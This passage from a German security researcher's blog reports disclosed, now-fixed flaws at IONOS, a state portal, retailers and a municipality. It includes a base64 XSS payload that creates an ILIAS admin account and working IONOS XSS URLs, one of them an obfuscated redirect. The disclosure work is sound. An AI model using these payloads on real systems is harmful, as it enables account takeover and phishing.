G4iK2RkKycgbmFtZT0ibXlDb3VudGVyIicraisiXHJcbiIrZGQrJyBuYW1lPSJyZWZlcnJhbF9jb
21tZW50IicraisiXHJcbiIrZGQrJyBuYW1lPSJteUNvdW50ZXIiJytqKyJcclxuIitkZCsnIG5hb
WU9ImludGVyZXN0c19nZW5lcmFsW10iJytqKyJcclxuIitkZCsnIG5hbWU9ImludGVyZXN0c19oZ
WxwX29mZmVyZWRbXSInK2orIlxyXG4iK2RkKycgbmFtZT0iaW50ZXJlc3RzX2hlbHBfbG9va2luZ
1tdIicraisiXHJcbiIrZGQrJyBuYW1lPSJtYXRyaWN1bGF0aW9uIicraisiXHJcbiIrZGQrJyBuY
W1lPSJjbGllbnRfaXAiJytqKyJcclxuIitkZCsnIG5hbWU9ImRlZmF1bHRfcm9sZSInK2orIjJcc
lxuIitkZCsnIG5hbWU9Imxhbmd1YWdlIicraisiZGVcclxuIitkZCsnIG5hbWU9InNraW5fc3R5b
GUiJytqKyJkZWZhdWx0OmRlbG9zXHJcbiIrZGQrJyBuYW1lPSJoaXRzX3Blcl9wYWdlIicraisiN
TBcclxuIitkZCsnIG5hbWU9ImhpZGVfb3duX29ubGluZV9zdGF0dXMiJytqKyJcclxuIitkZCsnI
G5hbWU9ImlsZmlsZWhhc2giJytqKyJkZjA2ZGEwZGYyZDViMzI5ZWYxYTgzMDI4Y2IzNGU4N1xyX
G4iK2RkKycgbmFtZT0iY21kW3NhdmVdIicraisiU3BlaWNoZXJuXHJcbi0tIitib3VuZGFyeSsiL
S0iO3NlbmRSZXF1ZXN0KGJhc2VVcmkrIi9pbGlhcy5waHA&b2=Y21kPXNob3cmY21kQ2xhc3M9aW
xkYXNoYm9hcmRndWkmYmFzZUNsYXNzPWlsRGFzaGJvYXJkR1VJIiwiR0VUIiwiIikudGhlbihmdW
5jdGlvbihlKXt2YXIgbj0obmV3IERPTVBhcnNlcikucGFyc2VGcm9tU3RyaW5nKGUucmVzcG9uc2
VUZXh0LCJ0ZXh0L2h0bWwiKS5nZXRFbGVtZW50QnlJZCgibW1fc2VhcmNoX2Zvcm0iKS5nZXRBdH
RyaWJ1dGUoImFjdGlvbiIpLm1hdGNoKC9ydG9rZW49KFteJl0rKS8pLGQ9bj9uWzFdOm51bGw7bn
VsbCE9ZD8oY29uc29sZS5sb2coIlsrXSBHb3QgYSB0b2tlbjogIitkKSxzZW5kUmVxdWVzdChiYX
NlVXJpKyIvaWxpYXMucGhwP3JlZl9pZD03JmFkbWluX21vZGU9c2V0dGluZ3MmY21kPXBvc3QmY2
1kQ2xhc3M9aWxvYmp1c2VyZ3VpJmNtZE5vZGU9MWQ6cjkmYmFzZUNsYXNzPWlsQWRtaW5pc3RyYX
Rpb25HVUkmcnRva2VuPSIrZCwiUE9TVCIsZGF0YSkudGhlbihmdW5jdGlvbihlKXtjb25zb2xlLm
xvZygiWytdIEFkbWluIFVzZXIgY3JlYXRlZC4iKX0pKTphbGVydCgiRmVobGVyLiBTaWUgc2luZC
BuaWNodCBhbHMgQWRtaW4gZWluZ2Vsb2dndCEiKX0pOw==</div>
		</code>
	</pre>
</div>
<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-text">
	<div><p>Der Aufruf dieser URL in einem nicht eingeloggten Zustand, erzeugt auf der learning-lab.bundesdruckerei.de Instanz einen Fehler in der Konsole. Sollte der Aufruf durch einen eingeloggten Administrator stattfinden, wird die Logik ausgeführt - sofern ILIAS Standard-Funktionalitäten nicht verändert wurden.</p>
</div>
</div>

<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-quote">
	<div><p>Da hier als Basis eine ILIAS Instanz &lt; v7.26 installiert ist, wäre es mir bei Ausführung dieser XSS Schwachstelle auch potenziell möglich eine Command Injection durchzuführen, um Zugriff auf den Server zu erlangen. Details hierzu können unter der von mir eingereichten <strong>CVE-2023-45869</strong> nachgelesen werden. Ein Exploit wurde von mir zwar nie veröffentlicht, ein potenzieller Angreifer könnte aber die notwendigen Details aus meinem Write-Up ableiten: <a target="_blank" rel="noopener" href="https://rehmeinfosec.de/labor/cve-2023-45869">https://rehmeinfosec.de/labor/cve-2023-45869</a></p>
</div>
</div></div>
    </div>
</div>

<div class="color-white paddingTop30 paddingBottom0 kesenheimer-matthias-container">
    <div class="inner container-fluid   ">
        <div class="neos-contentcollection"><div class="neos-nodetypes-html">
	<div id="tag3"></div>
</div>


<div class="paddingTop30 paddingBottom15 kesenheimer-matthias-headline">
	<div><h1>Tag 3: IONOS (1und1)</h1>
</div>
</div>
<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
	<div><p><strong>Organisation</strong>: <a target="_blank" rel="noopener" href="https://www.bundesdruckerei.de/de">IONOS SE</a><br />
<strong>Betroffene Systeme: </strong>ionos.de, logo-generator.ionos.com<br />
<strong>Schwachstellenmeldung</strong>: 8. Dezember 2022 (fixed)</p>
</div>
</div>

<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
	<div><h2>Beschreibung</h2>
</div>
</div>
<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
	<div><p>Die IONOS-Webanwendung war von einer reflektierten XSS-Schwachstelle betroffen, die es ermöglichte, Schadcode über einen URL-Abfrageparameter auszuspielen. Die Payload wurde im Browser unter Verwendung einer URL interpretiert und ausgeführt.</p>

<p>Durch die Ausführung der Payload mittels des Aufrufs eines entsprechenden Links wurde beispielsweise die Umleitung eines Opfers auf eine Phishing-Website ermöglicht oder die Ausführung von Applikationsfunktionen in dessen Kontext. Auch waren Session Cookies auslesbar.</p>

<p>Die Sicherheitslücke konnte in der Anwendung "<em>logo-generator.ionos.com</em>" ausfindig gemacht werden:</p>
</div>
</div>
<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-code">
	<pre class="line-numbers">
		<code class="language-php">
			<div>https://logo-generator.ionos.com/
?lang=de
&amp;tc=de
&amp;m=d
&amp;mt=%3Cscript%3Ealert(document.cookies)%3C/script%3E</div>
		</code>
	</pre>
</div>
<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
	<div><p>Interessant war hier, dass diese Anwendung direkt in der Haupseite unter "<em>ionos.de</em>" über ein iFrame eingebunden wurde. Über das eingebundene iFrame konnte so via "<strong>window.parent.location.href</strong>" die URL eines Angreifers auf der Hauptseite geladen werden.</p>
</div>
</div>
<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-code">
	<pre class="line-numbers">
		<code class="language-php">
			<div>https://www.ionos.de/tools/logo-erstellen
?lang=de
&amp;tc=de
&amp;m=e
&amp;mt=%3Cscript%3Eeval%28atob%28%27d2luZG93LnBhcmVudC5sb2NhdGlvbi5ocmVmPSJodHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9QaGlzaGluZyI7%27%29%29%3C%2Fscript%3E</div>
		</code>
	</pre>
</div>
<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
	<div><p>In einem Proof of Concept wurde exemplarisch ein Login-Formular integriert, das nicht von IONOS stammte. Auf diese Weise hätten potenzielle Angreifer Zugangsdaten abfangen können:</p>
</div>
</div>
<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-image">
	
<figure>
	


		
				
	<img src="_Resources/Persistent/91f1f88128a38be8432a06b088ad185767c1fe93/ionos-1025x875.png" width="1025" height="875" />

			
	


	
</figure>
</div></div>
    </div>
</div>

<div class="color-white paddingTop30 paddingBottom0 kesenheimer-matthias-container">
    <div class="inner container-fluid   ">
        <div class="neos-contentcollection"><div class="neos-nodetypes-html">
	<div id="tag5"></div>
</div>


<div class="paddingTop30 paddingBottom15 kesenheimer-matthias-headline">
	<div><h1>Tag 5: Rheinland-Pfalz</h1>
</div>
</div>
<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
	<div><p><strong>Organisation</strong>: <a target="_blank" rel="noopener" href="https://www.rlp.de/">Land Rheinland-Pfalz </a><br />
<strong>Betroffene Systeme: </strong>*.rlp.de<br />
<strong>Schwachstellenmeldung</strong>: 11. März 2023 (fixed)</p>
</div>
</div>

<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
	<div><h2>Beschreibung</h2>
</div>
</div>
<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
	<div><p>Eine Datenbankverwaltung (phpMyAdmin) war ungesichert und öffentlich abrufbar. Es konnten auf Datenbanken eines Datenbankservers ohne Zugangssicherung zugegriffen werden. Ein krimineller Angreifer hätte alle darin enthaltenen Daten lesen, oder verändern können. Die Möglichkeit neue Daten zu schreiben war ebenfalls gegeben.<br />
&nbsp;<br />
Enthalten waren z.B.:</p>

<p>&nbsp;&nbsp;&nbsp; - Zugangsdaten von Frontend User mit Passwörtern in Klartext.<br />
&nbsp;&nbsp;&nbsp; - Zugangsdaten von Backend User mit Passwörtern in MD5 (veraltetes Hashverfahren).<br />
&nbsp;&nbsp;&nbsp; - 13099 E-Mail Addressen in einer dmail Log.</p>

<p>Die Datenbanken wurden wahrscheinlich nicht in Produktion verwendet (zu letzt generiert Einträge waren nicht aktuell). Es wurde dennoch empfohlen unbedingt auch die darin gefundenen Passwörter zu änderen, da diese in den Liveinstanzen funktionierten.</p>
</div>
</div><div class="row paddingTop0 paddingBottom30 neos-nodetypes-twocolumn">
	<div class="col-lg-8 col-md-6 col-sm-6 col-xs-12 is-page neos-contentcollection">
<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-image">
	
<figure>
	


		
				
	<img title="Intranet" alt="Intranet" src="_Resources/Persistent/49c55cba5da92da1518f6c9d1cb0156d6f343e52/2024-01-05_22-53.png" width="1703" height="1526" />

			
	


	
</figure>
</div></div><div class="col-lg-4 col-md-6 col-sm-6 col-xs- is-page neos-contentcollection">
<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-image">
	
<figure>
	


		
				
	<img title="Intranet" alt="Intranet" src="_Resources/Persistent/ffaaa9a1ca7832802658466c66a166d29f8d16d5/2024-01-05_22-56.png" width="1027" height="1046" />

			
	


	
</figure>
</div></div>
</div>

<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-text">
	<div><p>Des weiteren wurde eine ungeschützte Seite innerhalb eines Adminbereichs (<em>/admin/test/</em>) entdeckt. Darüber konnten öffentlich zugänglich interne PDF Dokumente heruntergeladen werden. (z.B. eine Arbeitsanweißung wie die Einrichtung einer Remote Desktop Verbindung (via RDP) mit dem Desktop PC am Arbeitsplatz erfolgt.</p>
</div>
</div></div>
    </div>
</div>

<div class="color-white paddingTop30 paddingBottom0 kesenheimer-matthias-container">
    <div class="inner container-fluid   ">
        <div class="neos-contentcollection"><div class="neos-nodetypes-html">
	<div id="tag7"></div>
</div>


<div class="paddingTop30 paddingBottom15 kesenheimer-matthias-headline">
	<div><h1>Tag 7: EDIT.org</h1>
</div>
</div>
<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
	<div><p><strong>Organisation</strong>: <a target="_blank" rel="noopener" href="https://www.rlp.de/">EDIT.org </a><br />
<strong>Betroffene Systeme: </strong>edit.org<br />
<strong>Schwachstellenmeldung</strong>: 14. Dezember 2021 (fixed)</p>
</div>
</div>

<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
	<div><h2>Beschreibung</h2>
</div>
</div>
<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-text">
	<div><p>Eine <strong>nohup.out</strong> Datei war im documentRoot abgelegt.</p>

<p>In diesem File waren <strong>173,737 E-Mail Adressen</strong> von Kunden offen einsehbar.</p>

<p>Die Ausgaben eines mittels "nohup" aufgerufenen Programms werden automatisch in die Datei "nohup.out" umgeleitet. Diese Datei wird im Verzeichnis erstellt, von dem aus der Befehl ausgeführt wurde. Alternativ wäre es möglich gewesen, die Ausgabe in "/dev/null" zu lenken oder das File im Nachgang zu löschen.</p>
</div>
</div></div>
    </div>
</div>

<div class="color-white paddingTop30 paddingBottom0 kesenheimer-matthias-container">
    <div class="inner container-fluid   ">
        <div class="neos-contentcollection"><div class="neos-nodetypes-html">
	<div id="tag9"></div>
</div>


<div class="paddingTop30 paddingBottom15 kesenheimer-matthias-headline">
	<div><h1>Tag 9: Küche&amp;Co GmbH - a member of the otto group</h1>
</div>
</div>
<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
	<div><p><strong>Organisation</strong>: <a target="_blank" rel="noopener" href="https://www.kueche-co.de">Küche&amp;Co GmbH</a><a target="_blank" rel="noopener" href="https://www.rlp.de/"> </a><br />
<strong>Betroffene Systeme: </strong>kueche-co.de<br />
<strong>Schwachstellenmeldung</strong>: 4. Mai 2022 (fixed)</p>
</div>
</div>

<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
	<div><h2>Beschreibung</h2>
</div>
</div>
<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
	<div><p>Über einen öffentlich aufrufbaren Link konnte eine 50.8MB .tgz Datei ohne Zugangssicherung heruntergeladen werden: <a target="_blank" rel="noopener" href="https://intranet.kueche-co.de/archive.tgz">https://intranet.kueche-co.de/archive.tgz</a></p>

<p>Dieses Archiv beinhaltete eine Datei mit Kundendaten (Namen, Adressen, Email-Adressen und mehr) .</p>

<p><strong>Side Story:</strong><br />
Diese Meldung sollte mein erstes Bug Bounty sein, wo tatsächlich eine Prämie in Form von Geld als "Dankeschön" angeboten wurde. Naja, eigentlich.</p>
</div>
</div><div class="row paddingTop0 paddingBottom30 neos-nodetypes-twocolumn">
	<div class="col-lg-6 col-md-6 col-sm-12 col-xs-12 is-page neos-contentcollection">
<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-image">
	
<figure>
	


		
				
	<img title="Intranet" alt="Intranet" src="_Resources/Persistent/36ca709416115259cc21f9881e82bc094cda49a8/datenschutzbeauftragter_geld.png" width="1262" height="1627" />

			
	


	
</figure>
</div></div><div class="col-lg-6 col-md-6 col-sm-12 col-xs-12 is-page neos-contentcollection">
<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
	<div><p>Da ich meine Kontodaten nicht herausgeben und meine Person nicht nennen wollte, hatte ich nach einer anonymen Abwicklung (Amazon Gutschein, Paysafe etc.) gefragt. Ein paar Tage später nochmal nachgehakt und dann diese Antwort bekommen:</p>
</div>
</div>
<div class="paddingTop0 paddingBottom30 kesenheimer-matthias-image">
	
<figure>
	


		
				
	<img title="Intranet" alt="Intranet" src="_Resources/Persistent/84d653ff76b34ec8c4277821e9503821143c841e/datenschutzbeauftragter_geld.png" width="2202" height="1244" />

			
	


	
</figure>
</div><div class="neos-nodetypes-html">
	<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text"><div><p><span class="sparkling-test">Thrust me bro!</span></p></div></div>
</div>

<div class="paddingTop0 paddingBottom0 kesenheimer-matthias-image">
	
<figure>
	


		
				
	<img title="Intranet" alt="Intranet" src="_Resources/Persistent/4ef98496aa131204041015f721c013a00f1c6551/waiting.png" width="862" height="505" />

			
	


	
</figure>
</div></div>
</div>
</div>
    </div>
</div>

<div class="color-white paddingTop30 paddingBottom0 kesenheimer-matthias-container">
    <div class="inner container-fluid   ">
        <div class="neos-contentcollection"><div class="neos-nodetypes-html">
	<div id="tag11"></div>
</div>


<div class="paddingTop30 paddingBottom15 kesenheimer-matthias-headline">
	<div><h1>Tag 11: Gemeinde Roggenburg</h1>
</div>
</div>
<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
	<div><p><strong>Organisation</strong>: <a target="_blank" rel="noopener" href="https://www.roggenburg.de/">Gemeinde Roggenburg</a><a target="_blank" rel="noopener" href="https://www.rlp.de/"> </a><br />
<strong>Betroffene Systeme: </strong>roggenburg.de<br />
<strong>Schwachstellenmeldung</strong>: 24. Nov. 2023 (fixed)</p>
</div>
</div>

<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
	<div><h2>Beschreibung</h2>
</div>
</div>
<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
	<div><p>Der "Zweckverband gemeindliche Datenverarbeitung" im Landkreis Neu-Ulm ist Ende 2023 Opfer eines Ransomware Angriff geworden. Mehrere Kommunen im Landkreis Neu-Ulm wurden dadurch teilweise lahmgelegt. Darunter auch die Gemeinde Roggenburg. Der BR <a target="_blank" rel="noopener" href="https://www.br.de/nachrichten/bayern/cyberattacke-auf-zwoelf-schwaebische-gemeinden,TwRIz7A">berichtete</a> über den Vorfall.</p>

<p>Ich habe mir in diesem Zuge die Webseite der Gemeinde Roggenburg angeschaut. Innerhalb einer Minute konnte ich eine SQL-Injection ausfindig machen und ja, das ging tatsächlich so schnell, da mein erster Take immer die Eingabeprüfung von Input-Feldern ist. SQL-Injection ist eine kritische Sicherheitlücke, die es einem Angreifer ermöglicht mit der zugrunde liegenden Datenbank frei zu interagieren. Sie ermöglicht also den Zugriff auf alle Informatinen die darin gespeichert werden.</p>
</div>
</div><div class="row paddingTop0 paddingBottom30 neos-nodetypes-twocolumn">
	<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 is-page neos-contentcollection">
<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-image">
	
<figure>
	


		
				<a href="https://www.br.de/nachrichten/bayern/cyberangriffe-auf-kommunen-in-einer-minute-war-ich-im-system">
					
	<img src="_Resources/Persistent/949471cf1d6542920db3d4dc6265111fcb1e1fba/2024-01-11_15-25-1514x674.png" width="1514" height="674" />

				</a>
			
	


	
</figure>
</div></div><div class="col-lg-6 col-md-6 col-sm-6 col-xs- is-page neos-contentcollection">

<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
	<div><h2>Der BR berichtete auch über diesen Vorfall.</h2>
</div>
</div>
<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
	<div><p>Der Artikel ist hier zu lesen: <a target="_blank" rel="noopener" href="https://www.br.de/nachrichten/bayern/cyberangriffe-auf-kommunen-in-einer-minute-war-ich-im-system,U0t3w7t">https://www.br.de/nachrichten/bayern/cyberangriffe-auf-kommunen-in-einer-minute-war-ich-im-system</a></p>
</div>
</div></div>
</div>

<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
	<div><p><strong>Vorweg möchte ich direkt eine Lanze brechen</strong>: Das von der Gemeinde Roggenburg verwendete Content Management System betrachte ich als ausgesprochen sicher. Die von mir entdeckte Sicherheitslücke resultierte aus einer eigenentwickelten Komponente, die vom Dienstleister bereitgestellt wurde. Die Umsetzung und Implementierung entsprachen jedoch nicht den Standards, die das System vorgibt. Das konnte man z.B. beim Suchformular durch den fehlenden CSRF-Token erahnen.</p>
</div>
</div>

<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
	<div><h2>Ein technischer Einblick für interessierte</h2>
</div>
</div>
<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
	<div><p>Neos (das verwendete System), sollte nicht als klassisches CMS verstanden werden, sondern eher als Content Application Plattform. Entwickler können mithilfe von NodeTypes und Fusion ihre eigenen Inhaltselemente erstellen. Diese können dann von Redakteuren über das Backend zur Contentpflege genutzt werden. Die traditionelle Umsetzung von Elementen erfordert in technischer Hinsicht also keine Programmierung in PHP oder gar SQL.</p>

<p><strong>Warum war eine SQL Injection möglich?</strong></p>

<p>Hierzu muss man das System zunächst grob verstehen.</p>

<p>Neos basiert auf einem eigens entwickelten PHP-Framework namens Neos Flow. Das MVC-Paradigma in Neos lässt sich vereinfacht wie folgt erklären:</p>

<ol>
	<li><strong>Controller:</strong> Verantwortlich für die eigene Logik.</li>
	<li><strong>Model:</strong> Abbildung der Geschäftslogik und einer Entität nach den Konzepten des Domain-Driven Design.</li>
	<li><strong>Repository:</strong> Dient als Schnittstelle zwischen der Geschäftslogik (dem Model) und dem Data Storage (z.B. MySQL). Das Repository ist der Ort, an dem die Logik für Datenbankabfragen in das persistente Framework übergeht - standardmäßig Doctrine 2 ORM.</li>
</ol>

<p>Wer sich bereits mit DBAL auseinandergesetzt hat, wird sofort feststellen, dass durch die Verwendung von Prepared Statements SQL-Injection ausgeschlossen ist. Wenn also die Logik in Neos erweitert werden muss, um bestimmte Anforderungen zu erfüllen, wird PHP hinzugezogen. Meine Vermutung ist, dass eine entsprechende Anbindung an ein anderes System über Datenbankanfragen (ohne ORM) erforderlich war. Die nativen SQL-Abfragen werden im Controller an eine externe Datenbank durchgeführt, vermutlich, um auch Inhalte in die Suche einzubeziehen, die nicht als Node über ein Repository abrufbar sind.</p>

<p>Fatal wird es, wenn Anfrage-Parameter vom Client in einer Datenbankabfrage ohne Überprüfung in die Query übernommen und ausgeführt werden, was hier der Fall war. Bei einer Anfrage an eine externe Datenbank erfolgt üblicherweise eine Suche in einer oder mehreren Tabellen nach Inhalten, die dem Suchbegriff entsprechen. Durch eine SQL-Injection kann ein Angreifer jedoch die Anfrage manipulieren und dadurch Zugriff auf ALLE Tabellen sowie in bestimmten Fällen auch auf andere Datenbanken erhalten. Das ermöglicht den Zugriff auf äußerst sensible Informationen, einschließlich personenbezogener Daten, aber auch auf Zugangsdaten, Secrets, API Creds, Tokens oder andere Verbindungsdaten, die ebenfalls in der Datenbank gespeichert sind und für weiterführende Angriffe genutzt werden können.</p>

<p>Inhalte aus Tabellen wie <strong>Core_Conf_Exchange</strong>, <strong>Core_DeviceToken</strong>, <strong>APT_Appointments</strong>, <strong>ABS_AppConfiguration</strong>, <strong>Core_User</strong>, <strong>Core_UserAuthentications</strong>, <strong>IMS_ExternalUsers</strong> oder <strong>GDC_ExternalAPIConfig</strong> sind nicht vorgesehen, über eine Suchergebnisseite ausgegeben zu werden.</p>

<p><em>Meine Anfragen begrenzten sich bei der Ausforschung im übrigen nur auf die Ausgabe der Datenbank Struktur, nicht aber auf Datensätze aus Tabellen. Das wäre auch absolut unnötig für das Aufzeigen dieser Sicherheitslücke gewesen.</em></p>

<p>Meiner Meinung nach zählt das Content Management System (CMS), das von der Gemeinde Roggenburg eingesetzt wird, zu den besten und innovativsten, die mir bekannt sind. Aufgrund meiner Erfahrungen mit verschiedenen Systemen kann ich für mich behaupten, dass die Codebasis von Neos (bzw. Flow) im Vergleich zu gängigen Systemen wie Drupal oder TYPO3 besonders hochwertig und durchdacht wirkt. Hier wird nicht nur sorgfältig auf Standards geachtet, sondern auch kontinuierlich der neueste Stand der Technik verfolgt.</p>

<p>Das Content Repository, das auf Event Sourcing basiert und mit der Version 9 eingeführt wurde, halte ich für bahnbrechend. Die Sicherheitsbilanz von Neos lässt sich auch sehen: Im Laufe der Jahre wurden nur wenige Schwachstellen entdeckt, und selbst diese waren in der Regel nur mit hohen Privilegien ausnutzbar, sofern überhaupt exploitfähig. Daher ist es nicht verwunderlich, dass auch ich auf Neos setze – mein Blog z.B. basiert auf diesem System.</p>
</div>
</div>

<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
	<div><h2>Long story short</h2>
</div>
</div>
<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
	<div><p>Eine vulnerable Third-Party Komponente, welche Sicherheitslücken eröffnet, wird bei jedem (!) System Türen für Angreifer öffnen. Ich <a href="https://mkesenheimer.github.io/mkesenheimer.github.io/index.html/blog/informationssicherheit-in-den-kommunen">untersuche nun seit drei Jahren</a> immer wieder kommunale Webapplikationen und muss unter dem Strich feststellen, dass so gut wie nie das zugrundeliegende System an sich vulnerabel ist, sondern entweder Fehlkonfigurationen oder Eigenentwicklungen in Form von Erweiterungen, Plugins bzw. Extensions durch die jeweiligen Dienstleister, welche Sicherheitslücken eröffneten.</p>
</div>
</div>

<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-headline">
	<div><h2>Liebe Kommunalvertretung</h2>
</div>
</div>
<div class="paddingTop0 paddingBottom15 kesenheimer-matthias-text">
	<div><p>Open Source-Produkte sollten meiner Meinung nach immer bevorzugt werden. Durch den öffentlich einsehbaren Quellcode ist in der Regel gewährleistet, dass, abhängig von der Popularität, eine vielzahl an Entwickler:innen den Code überprüfen, was eine höhere Sicherheit bietet als bei einem geschlossenen System, das in den Händen von ein paar Entwickler:innen liegt. Systeme wie Neos, TYPO3 oder Drupal sowie Eigenentwicklungen auf Basis von Frameworks wie Neos Flow, Laravel oder Symfony können durchaus <strong>sicher</strong> betrieben werden. Der entscheidende Punkt liegt jedoch immer beim verantwortlichen Dienstleister, der auf Basis dieser Systeme Webapplikationen umsetzt und mit eigener Programmierung "ergänzt". Eine Kommune kann die Qualität in der Regel nicht selbst kontrollieren - klar. Daher ist es ratsam, produktive Systeme, die sensible Daten verarbeiten, entweder einem Penetrationstest oder einem Code-Audit von einem unabhängigen Dienstleister unterziehen zu lassen.</p>

<p><strong>Auch wenn Sie hohe Ansprüche und Erwartungen an ein System haben, ist eine entsprechende Beachtung in der "eigenen" Entwicklung unerlässlich. Weder ein Standard noch eine ISO-Zertifizierung wird Sie vor einem erfolgreichen Angriff schützen, wenn sich durch Nachlässigkeit oder Unwissenheit Sicherheitslücken ergeben.</strong><br />
<br />
Achja. Sollte Ihnen jemand Wordpress andrehen wollen, dann verbannen Sie das Angebot bitte direkt in den Papierkorb.</p>
</div>
</div></div>
    </div>
</div>

<div class="color-white paddingTop30 paddingBottom30 kesenheimer-matthias-container">
    <div class="inner container-fluid   ">
        <div class="neos-contentcollection">
<div class="paddingTop15 paddingBottom30 kesenheimer-matthias-text">
	<div><h3><strong>Further publications have been interrupted for current reasons. As long as an ethical hacker has to fear legal consequences when responsibly disclosing security vulnerabilities, I will not be able to continue here. <a target="_blank" rel="noopener" href="https://www.heise.de/meinung/Kommentar-zu-Modern-Solution-Der-Hackerparagraf-muss-endlich-weg-9602664.html">Finally reform the hacker paragraph</a> ...</strong></h3>
</div>
</div></div>
    </div>
</div></div>
		</section>

		<section id="footer">
			<div class="footer_top inner">
				<div class="bg_image"></div>
			</div>
			<div class="footer_bottom">
				<div class="parallax">
					<div class="layer layer1"></div>
					<div class="layer layer2"></div>
					<div class="layer layer3"></div>
				</div>
			</div>
			<div class="footer_scene">
				<div class="inner">
					<div class="bg_image"></div>
					<a class="char" href="/world">
						<img alt="easter egg" src="_Resources/Static/Packages/matthias.kesenheimer/Images/easter_egg.png" width="54" height="79">
						<div class="speak">
							<div class="boubble">
								Enter my world!
							</div>
						</div>
					</a>
				</div>
			</div>
			<div class="copy">
				<div class="inner">
					<div class="neos-contentcollection">
<div class="paddingTop15 paddingBottom15 kesenheimer-matthias-text">
	<div><p style="text-align:center">This website is powered by&nbsp;<a target="_blank" rel="noopener" href="https://neos.io">Neos</a><br />
<a href="/impressum">Impressum</a> | <a href="/datenschutz">Datenschutz</a></p>
</div>
</div></div>
				</div>
			</div>
		</section>
	</div>
<script data-neos-node="/sites/kesenheimer-matthias/node-auh0tef0k5fuq/node-wmaycdh5qflf6@live;language=de" src="_Resources/Static/Packages/Neos.Neos/JavaScript/LastVisitedNode.js" async></script></body></html>